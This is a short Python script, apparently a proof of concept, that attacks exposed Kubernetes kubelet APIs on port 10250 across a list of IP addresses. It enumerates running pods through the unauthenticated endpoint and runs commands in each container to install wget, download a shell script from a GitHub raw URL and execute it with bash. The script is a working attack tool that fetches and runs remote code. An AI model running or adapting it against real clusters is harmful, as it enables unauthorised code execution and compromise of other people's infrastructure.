import requests
import json
import sys
import traceback
import time


def run_cmd(ip, namespace, name, container_name, cmd):
    req = requests.post(f"https://{ip}:10250/run/{namespace}/{name}/{container_name}?cmd={cmd}", verify=False)
    if req.status_code == 200:
        print("Ran successfully, here's the output")
        print(req.text)
    else:
        print("Something went wrong")
        print(req.text)
    time.sleep(5)

# read file from stdin
ip_file = open(sys.argv[1], 'r').read().split('\n')
for i in ip_file:
    # try to find running pods
    pods = requests.get(f"https://{i}:10250/runningpods/", verify=False)
    if pods.status_code == 200:
        resp = pods.json()
        try:
            for item in resp['items']:
                name = item['metadata']['name']
                namespace = item['metadata']['namespace']
                container_name = item['spec']['containers'][0]['name']
                # execute same thing in them
                run_cmd(i, namespace, name, container_name, "/bin/apt-get update")
                run_cmd(i, namespace, name, container_name, "/bin/apt-get install -y wget")
                run_cmd(i, namespace, name, container_name, "/bin/wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/master/run.sh -O run.sh")
                run_cmd(i, namespace, name, container_name, "/bin/bash /run.sh")
        except:
            print("Something went wrong")
            print(traceback.format_exc())
            sys.exit(1)
    else:
        print("Something went wrong")
        print(pods.text)

